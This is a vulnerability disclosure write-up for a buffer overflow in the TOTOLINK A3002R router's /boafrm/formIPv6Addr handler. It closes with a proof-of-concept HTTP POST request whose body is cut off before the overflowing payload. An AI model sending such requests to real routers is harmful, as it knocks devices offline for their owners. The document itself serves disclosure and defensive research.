# Information



**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Affected products:** A3002R

**Affected firmware version:** V4.0.0-B20230531.1404

**Firmware download address:** [download]([TOTOLINK](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/258/ids/36.html))

# Overview

TOTOLINK A3002R V4.0.0-B20230531.1404 router has a serious buffer overflow vulnerability. This vulnerability can be triggered through the route /boafrm/formIPv6Addr. An attacker can implement a denial of service attack by sending a malicious HTTP POST request.

# Vulnerability details

![image-20250608155417068](16/image-20250608155417068.png)

Here, reasonable assignment is made and judgment is made

![image-20250608191852412](16/image-20250608191852412.png)

![image-20250608191928498](16/image-20250608191928498.png)

There is a buffer overflow here

![image-20250608192030061](16/image-20250608192030061.png)

# POC

```
POST /boafrm/formIPv6Addr HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1086
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/wlsecurity.htm
Priority: u=0

sessionCheck=5c9b0d67e41310543dbb1375309ac71d&submit=1&submit-url=http:
```
